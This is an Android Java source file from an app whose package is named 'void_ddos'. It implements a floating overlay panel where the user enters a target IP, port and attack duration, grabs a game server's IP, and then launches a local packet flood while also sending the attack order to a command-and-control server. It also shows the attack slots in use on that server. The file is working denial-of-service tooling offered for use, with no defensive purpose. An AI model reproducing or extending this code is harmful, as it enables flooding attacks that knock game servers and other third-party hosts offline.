package com.void_ddos;

import android.app.*;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.*;
import android.view.*;
import android.widget.*;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class OverlayService extends Service {

    private static final String C2_URL = "http://YOUR_VPS_IP:8080";
    private static final String CHANNEL_ID = "alpha_ch";

    private WindowManager wm;
    private View overlayPanel;
    private View miniIcon;
    private FloodEngine floodEngine;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, buildNotification());
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        floodEngine = new FloodEngine();
        showMiniIcon();
    }

    // ── MINI ICON ─────────────────────────────────────────────────
    private void showMiniIcon() {
        LayoutInflater inf = LayoutInflater.from(this);
        miniIcon = inf.inflate(R.layout.overlay_mini, null);

        WindowManager.LayoutParams p = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);
        p.gravity = Gravity.TOP | Gravity.START;
        p.x = 0; p.y = 300;

        makeDraggable(miniIcon, p);

        miniIcon.setOnClickListener(v -> {
            wm.removeView(miniIcon);
            miniIcon = null;
            showOverlayPanel();
        });

        wm.addView(miniIcon, p);
    }

    // ── OVERLAY PANEL ─────────────────────────────────────────────
    private void showOverlayPanel() {
        LayoutInflater inf = LayoutInflater.from(this);
        overlayPanel = inf.inflate(R.layout.overlay_panel, null);

        WindowManager.LayoutParams p = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);
        p.gravity = Gravity.TOP | Gravity.START;
        p.x = 10; p.y = 200;

        makeDraggable(overlayPanel, p);

        // bind views
        EditText etIp       = overlayPanel.findViewById(R.id.et_ip);
        EditText etPort     = overlayPanel.findViewById(R.id.et_port);
        SeekBar sbDuration  = overlayPanel.findViewById(R.id.sb_duration);
        TextView tvDuration = overlayPanel.findViewById(R.id.tv_duration);
        TextView tvSlots    = overlayPanel.findViewById(R.id.tv_slots);
        TextView tvStatus   = overlayPanel.findViewById(R.id.tv_attack_status);
        TextView tvDate     = overlayPanel.findViewById(R.id.tv_date);
        LinearLayout llBars = overlayPanel.findViewById(R.id.ll_slot_bars);
        Button btnGetIp     = overlayPanel.findViewById(R.id.btn_get_ip);
        Button btnLaunch    = overlayPanel.findViewById(R.id.btn_launch);
        TextView btnClose   = overlayPanel.findViewById(R.id.btn_close);

        // date
        tvDate.setText(new SimpleDateFormat("dd MMM yyyy",
                Locale.getDefault()).format(new Date()));

        // duration slider
        sbDuration.setMax(300);
        sbDuration.setProgress(200);
        tvDuration.setText("200s");
        sbDuration.setOnSeekBarChangeListener(
                new SeekBar.OnSeekBarChangeListener() {
            @Override public void onProgressChanged(
                    SeekBar s, int p2, boolean u) {
                tvDuration.setText(p2 + "s");
            }
            @Override public void onStartTrackingTouch(SeekBar s) {}
            @Override public void onStopTrackingTouch(SeekBar s) {}
        });

        // fetch slots
        fetchSlotsForOverlay(tvSlots, llBars);

        // GET IP
        btnGetIp.setOnClickListener(v ->
                IpCapture.getGameServerIp(ip -> {
                    if (ip != null)
                        handler.post(() -> etIp.setText(ip));
                    else
                        handler.post(() -> Toast.makeText(
                                getApplicationContext(),
                                "Could not capture IP",
                                Toast.LENGTH_SHORT).show());
                }));

        // LAUNCH
        btnLaunch.setOnClickListener(v -> {
            String ip = etIp.getText().toString().trim();
            String portStr = etPort.getText().toString().trim();
            if (ip.isEmpty() || portStr.isEmpty()) {
                Toast.makeText(getApplicationContext(),
                        "Enter IP and Port",
                        Toast.LENGTH_SHORT).show();
                return;
            }
            int port = Integer.parseInt(portStr);
            int duration = sbDuration.getProgress();
            String key = getSharedPreferences("vault", MODE_PRIVATE)
                    .getString("active_key", "");

            // local flood
            floodEngine.startFlood(ip, port, duration);

            // C2 flood
            new Thread(() -> {
                try {
                    String result = ApiClient.launchAttack(
                            C2_URL, key, ip, port, duration);
                    JSONObject j = new JSONObject(result);
                    int pct = j.optInt("percent", 100);
                    handler.post(() -> {
                        tvStatus.setVisibility(View.VISIBLE);
                        tvStatus.setText("> ATTACK SENT [" + pct + "%]");
                        fetchSlotsForOverlay(tvSlots, llBars);
                    });
                } catch (Exception e) {
                    handler.post(() -> {
                        tvStatus.setVisibility(View.VISIBLE);
                        tvStatus.setText("> LOCAL FLOOD ACTIVE");
                    });
                }
            }).start();
        });

        // CLOSE → back to mini icon
        btnClose.setOnClickListener(v -> {
            wm.removeView(overlayPanel);
            overlayPanel = null;
            floodEngine.stopAll();
            showMiniIcon();
        });

        wm.addView(overlayPanel, p);
    }

    // ── SLOTS ──────────────────────────────────────────────────────
    private void fetchSlotsForOverlay(TextView tvSlots,
            LinearLayout llBars) {
        new Thread(() -> {
            try {
                String result = ApiClient.getSlots(C2_URL);
                JSONObject j = new JSONObject(result);
                int active = j.getInt("active");
                int max = j.getInt("max");
                handler.post(() -> {
                    tvSlots.setText(
                            "LIVE SLOTS " + active + " / " + max);
                    llBars.removeAllViews();
                    for (int i = 0; i < max; i++) {
                        View bar = new View(getApplicationContext());
                        LinearLayout.LayoutParams lp =
                                new LinearLayout.LayoutParams(
                                        0, 10, 1f);
                        lp.setMargins(2, 0, 2, 0);
                        bar.setLayoutParams(lp);
                        bar.setBackgroundColor(
                                i < active ? 0xFFFFD700 : 0xFF333333);
                        llBars.addView(bar);
                    }
                });
            } catch (Exception ignored) {}
        }).start();
    }

    // ── DRAG ───────────────────────────────────────────────────────
    private void makeDraggable(View view,
            WindowManager.LayoutParams params) {
        view.setOnTouchListener(new View.OnTouchListener() {
            int lastX, lastY;
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                        lastX = (int) event.getRawX();
                        lastY = (int) event.getRawY();
                        break;
                    case MotionEvent.ACTION_MOVE:
                        params.x += (int) event.getRawX() - lastX;
                        params.y += (int) event.getRawY() - lastY;
                        wm.updateViewLayout(view, params);
                        lastX = (int) event.getRawX();
                        lastY = (int) event.getRawY();
                        break;
                }
                return false;
            }
        });
    }

    // ── NOTIFICATION ───────────────────────────────────────────────
    private void createNotificationChannel() {
        NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID,
                getString(R.string.channel_name),
                NotificationManager.IMPORTANCE_LOW);
        ((NotificationManager) getSystemService(
                NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("ALPHA OVERLAY")
                .setContentText("Tactical Control Panel Active")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (overlayPanel != null) wm.removeView(overlayPanel);
        if (miniIcon != null) wm.removeView(miniIcon);
        floodEngine.stopAll();
        handler.removeCallbacksAndMessages(null);
    }
}